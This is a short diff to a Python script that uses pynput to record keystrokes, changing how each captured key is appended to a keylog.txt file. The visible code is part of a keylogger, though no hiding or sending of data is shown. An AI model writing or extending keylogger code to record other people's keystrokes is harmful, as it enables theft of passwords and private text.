@@ -4,7 +4,7 @@ import pynput.keyboard
 def write_to_file(key):
     key_data = str(key)
     with open("keylog.txt", "a") as f:
-        f.write(key_data)
+        f.write(key_data + "\n")
         
 # Function to handle the pressing of keys
 def on_press(key):
